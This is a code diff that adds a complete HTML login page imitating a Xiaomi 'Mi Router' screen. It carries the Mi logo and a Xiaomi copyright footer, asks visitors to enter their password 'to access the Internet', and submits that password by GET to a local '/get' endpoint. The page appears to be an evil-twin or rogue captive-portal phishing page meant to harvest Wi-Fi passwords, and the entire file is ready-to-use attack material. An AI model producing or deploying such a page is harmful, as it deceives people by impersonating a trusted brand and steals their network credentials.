@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mi Router</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f6f7f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+
+        header {
+            width: 100%;
+            height: 140px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-wrapper {
+            width: 64px;
+            height: 64px;
+        }
+
+        .logo-wrapper svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        .login-card {
+            background: #fff;
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 30px;
+            border-radius: 28px;
+            text-align: center;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 500;
+            color: #333;
+            margin: 0 0 10px 0;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 35px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 16px 20px;
+            background-color: #f1f2f5;
+            border: 2px solid transparent;
+            border-radius: 18px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+            margin-bottom: 20px;
+        }
+
+        input[type="password"]:focus {
+            background-color: #fff;
+            border-color: #ff6700;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: #ff6700;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 18px;
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(255, 105, 0, 0.2);
+            transition: 0.2s;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            color: #ccc;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo-wrapper">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="-200.008 -199.727 512 512">
+            <g>
+                <g>
+                    <g>
+                        <path id="路径_1_" fill="#FF6900" d="M258.626-146.231c-48.304-48.118-117.759-53.496-202.634-53.496 c-84.982,0-154.542,5.44-202.826,53.688c-48.277,48.228-53.174,117.676-53.174,202.561c0,84.899,4.897,154.368,53.194,202.613 c48.281,48.255,117.833,53.139,202.806,53.139c84.974,0,154.514-4.884,202.795-53.139 c48.294-48.254,53.205-117.714,53.205-202.613C311.992-28.472,307.028-97.995,258.626-146.231L258.626-146.231z"/>
+                    </g>
+                </g>
+                <g>
+                    <g>
+                        <path id="形状结合" fill="#FFFFFF" d="M204.546-41.122c1.759,0,3.223,1.417,3.223,3.161v189.386 c0,1.715-1.464,3.139-3.223,3.139H163.05c-1.781,0-3.228-1.424-3.228-3.139V-37.961c0-1.743,1.446-3.161,3.228-3.161H204.546z M24.468-41.122c31.303,0,64.033,1.435,80.176,17.589c15.871,15.897,17.59,47.549,17.656,78.286v96.671 c0,1.715-1.446,3.139-3.219,3.139h-41.49c-1.777,0-3.229-1.424-3.229-3.139V53.09c-0.044-17.167-1.031-34.81-9.884-43.692 c-7.62-7.641-21.839-9.391-36.625-9.754h-75.21c-1.764,0-3.208,1.419-3.208,3.136v148.645c0,1.715-1.462,3.139-3.237,3.139 h-41.516c-1.774,0-3.201-1.424-3.201-3.139V-37.961c0-1.743,1.426-3.161,3.201-3.161H24.468z M33.755,34.305 c1.766,0,3.201,1.413,3.201,3.143v113.977c0,1.715-1.436,3.139-3.201,3.139H-9.829c-1.792,0-3.228-1.424-3.228-3.139V37.448 c0-1.73,1.436-3.143,3.228-3.143H33.755z"/>
+                    </g>
+                </g>
+            </g>
+        </svg>
+    </div>
+</header>
+
+<div class="login-card">
+    <h2>Mi Router</h2>
+    <div class="desc">Enter your password to access the Internet</div>
+
+    <form action="/get" method="GET">
+        <input type="password" name="password" placeholder="Password" required autofocus>
+        <button type="submit">Enter</button>
+    </form>
+</div>
+
+<footer>
+    © Xiaomi Inc. All rights reserved. 2026
+</footer>
+
+</body>
+</html>
